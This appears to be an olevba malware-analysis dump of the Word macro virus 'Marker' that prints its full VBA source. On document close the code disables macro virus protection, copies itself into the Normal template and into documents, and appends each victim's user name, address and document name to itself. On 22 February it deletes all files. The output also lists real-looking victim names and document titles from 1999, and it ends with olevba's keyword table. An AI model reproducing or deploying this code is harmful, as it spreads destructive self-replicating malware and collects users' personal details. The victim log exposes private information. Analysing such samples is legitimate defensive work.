olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-f42d3762f2dea4a4bd7e4f7c04f9b9f949bc22b1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-f42d3762f2dea4a4bd7e4f7c04f9b9f949bc22b1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()

On Error Resume Next

Const Murder = "<-- Its Murder!!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim rep As Integer
Dim virusCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.codemodule.Find(Murder, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.codemodule.Find(Murder, 1, 1, 10000, 10000)

'Switch the VirusProtection OFF
Options.VirusProtection = False
Options.SaveNormalPrompt = False



'PayLoad
Delivery:
If Day(Now()) = 22 And Month(Now()) = 2 Then
       Kill "*.*":
       rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
       GoTo Delivery
       End If
       
'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   


'.......................................................................................
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
  virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
    'Write a log file of this NormalTemplate infection
    For I = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next I

    LogData = Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM -") & _
                     Format(Date, "dddd,d mmm,yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & Application.UserAddress & Chr(13) & _
              "' " & Application.ActiveDocument & Chr(13)
              
              
    virusCode = virusCode & LogData
   

    nt.codemodule.DeleteLines 1, nt.codemodule.countoflines
    nt.codemodule.AddFromString virusCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
 
End If



'..........................................................................................
  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines)

    ad.codemodule.DeleteLines 1, ad.codemodule.countoflines
    ad.codemodule.AddFromString virusCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    End If



End Sub


' Potential Murder Victims  "Marked for death...If I kiss you now, you'll probably die later..."
'

' 12:00:00 AM -Thursday,6 May,1999
' Ryde or Die
' The world
' ThE GeNiUs.doc

' 06:27:03 PM -Thursday,6 May,1999
' Valued Gateway Customer
'
' 1st Trial.doc



' 10:10:56 AM -Friday,7 May,1999
' Valued Gateway Customer
'
' 1st Trial.doc



' 02:33:34 PM -Saturday,8 May,1999
' Matthew E. Dawson
'
' Psychology paper.doc



' 08:17:21 PM -Wednesday,12 May,1999
' administrator
'
' str.doc



' 02:53:16 PM -Thursday,13 May,1999
' John C. Carrington
'
' OPS4_ROY_REL.doc



' 09:32:48 AM -Monday,17 May,1999
' Obrienw
'
' Amara.doc



' 04:10:58 PM -Monday,17 May,1999
' BorellJ
'
' mdpobrien.doc



' 11:07:03 AM -Wednesday,19 May,1999
' studerp
'
' 524&525 rstr.doc



' 05:15:29 PM -Thursday,20 May,1999
' catyt
'
' May-1999-Activity Report-TCaty.doc



' 03:41:04 PM -Friday,21 May,1999
' WallW
'
' 24 HOUR ACCIDENT NOTICE - MAJOR.doc



' 09:05:15 AM -Monday,24 May,1999
' Jeffrey B. Axelrod
'
' 5-21-99 MWP-JBA-RCL Draft LT Owner.doc



' 07:13:38 AM -Wednesday,2 Jun,1999
' Faist_Michael
'
' tcmis license.doc



' 11:40:43 AM -Friday,4 Jun,1999
' 48207
'
' catalog.doc



' 07:24:57 AM -Tuesday,8 Jun,1999
' .
'
' OpsEngLabsCPP.doc



' 12:23:16 PM -Tuesday,8 Jun,1999
' .
'
' 9349901.doc



' 02:22:53 PM -Thursday,10 Jun,1999
' .
'
' 060799.DOC



' 12:52:05 PM -Wednesday,16 Jun,1999
' 66887
'
' OFFSUPP5.DOC



' 08:34:23 AM -Thursday,24 Jun,1999
' .
'
' Supplyauthor.doc



' 09:25:58 AM -Thursday,24 Jun,1999
' .
'
' swioi62499.doc



' 06:00:37 PM -Thursday,24 Jun,1999
' .
'
' IOI.doc



' 08:05:29 AM -Monday,28 Jun,1999
' .
'
' flts3.doc



' 10:24:54 AM -Monday,28 Jun,1999
' .
'
' MECMMWOH.doc



' 05:20:43 PM -Tuesday,29 Jun,1999
' .
'
' PB30.doc



' 10:01:04 AM -Wednesday,30 Jun,1999
' 39849
'
' AGENDA30june6.doc



' 08:55:01 AM -Tuesday,6 Jul,1999
' Glenda Frazier
'
' System Performance Analysis.doc



' 02:06:45 PM -Wednesday,7 Jul,1999
' .
'
' CDR GF Minutes.doc



' 08:51:27 AM -Monday,12 Jul,1999
' .
'
' CDR minutes 07-08-99.doc



' 03:56:05 PM -Tuesday,13 Jul,1999
' .
'
' data management req.doc



' 03:06:06 PM -Tuesday,20 Jul,1999
' Hang Yee Wong
'
' 00000000.DOC



' 03:17:16 PM -Tuesday,27 Feb,2001
' Tester
'
' 00005519.DOC


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

